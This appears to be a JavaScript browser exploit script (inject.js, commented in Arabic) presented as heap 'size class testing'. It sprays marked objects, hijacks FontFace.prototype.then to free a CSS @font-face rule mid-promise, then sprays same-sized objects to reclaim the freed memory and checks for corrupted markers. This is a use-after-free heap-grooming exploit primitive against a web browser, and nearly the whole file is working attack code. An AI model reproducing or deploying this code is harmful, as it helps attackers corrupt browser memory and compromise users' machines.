/**
 * [RESEARCH & DEVELOPMENT] - Multi-Property Size Class Testing
 * الملف: inject.js
 * الوظيفة: اختبار تدرج فئات الحجم (Size Classes) في الـ Heap عبر توسيع الكائنات
 */

ssa("[*] تم تحميل سكريبت توسيع الخصائص واختبار فئات الحجم...");

function runSizeClassTest() {
    try {
        ssa("[*] بدء الاختبار: بناء مصفوفة المراقبة موسعة الخصائص...");
        
        let expandedObservationGroup = [];
        
        // 1. إنشاء كائنات بحجم فيزيائي أكبر عبر زيادة عدد الخصائص (8 خصائص متتالية)
        for (let i = 0; i < 60; i++) {
            let expandedObj = {};
            expandedObj.p1 = 0x11111111;
            expandedObj.p2 = 0x22222222;
            expandedObj.p3 = 0x33333333;
            expandedObj.p4 = 0x44444444;
            expandedObj.p5 = 0x55555555;
            expandedObj.p6 = 0x66666666;
            expandedObj.p7 = 0x77777777;
            expandedObj.p8 = 0x88888888;
            expandedObj.marker = 0xABCDEF; // علامة الفحص الثابتة
            
            expandedObservationGroup.push(expandedObj);
        }

        // 2. إعداد عنصر النمط لثغرة الخطوط
        const expandedStyle = document.createElement('style');
        expandedStyle.id = 'expanded_vulnerable_style';
        expandedStyle.innerHTML = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
        document.head.appendChild(expandedStyle);

        // 3. إنشاء كائن الخط وتنشيط الوعد
        let testFace = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(testFace);
        void testFace.loaded;

        let isRaceActive = false;

        // 4. اعتراض معالج التزامن وتطبيق التحرير (Free)
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                if (!isRaceActive && this === testFace) {
                    isRaceActive = true;
                    ssa("[!!] [THE_RACE] معالج التزامن نشط الآن في الفئة الموسعة.");

                    // تحرير الكائن
                    document.getElementById('expanded_vulnerable_style').sheet.deleteRule(0);

                    // فرض تحديث التنسيق لإتمام التحرير في الـ Heap
                    let layoutFlush = document.body.offsetTop;

                    // محاولة ملء الفراغ بكائنات موسعة مطابقة الحجم
                    for (let k = 0; k < 50; k++) {
                        let fillObj = { 
                            a1: 1, a2: 2, a3: 3, a4: 4, 
                            a5: 5, a6: 6, a7: 7, a8: 8 
                        };
                        fillObj.marker = 0x9999;
                    }
                }
                return undefined;
            }
        });

        // 5. بدء العملية المنطقية عبر دالة التحميل
        document.fonts.load('1em x', 'AB');

        // 6. التحقق من التغيير بعد مهلة زمنية قصيرة
        setTimeout(() => {
            ssa("[*] فحص الخصائص الموسعة للكائنات المفحوصة...");
            
            let changeDetected = false;
            
            for (let m = 0; m < expandedObservationGroup.length; m++) {
                if (expandedObservationGroup[m].marker !== 0xABCDEF) {
                    ssa("[+] [STRUCT_CHANGE] رصد تغير في محاذاة الكائن رقم: " + m);
                    changeDetected = true;
                    break;
                }
            }

            if (!changeDetected) {
                ssa("[-] مستويات الذاكرة مستقرة مجاورة (لم يتم رصد تداخل في فئة الحجم الحالية).");
            }

            ssa("[+] انتهت دورة الاختبار الحالية.");
        }, 200);

    } catch (err) {
        ssa("[-] خطأ أثناء تشغيل الفحص الموسع: " + err.message);
    }
}

// ربط آلية التفعيل بزر التشغيل الخاص بالواجهة المرفوعة
document.getElementById('exec-btn').addEventListener('click', function() {
    ssa("[*] إطلاق فحص فئة الحجم الموسعة...");
    runSizeClassTest();
});
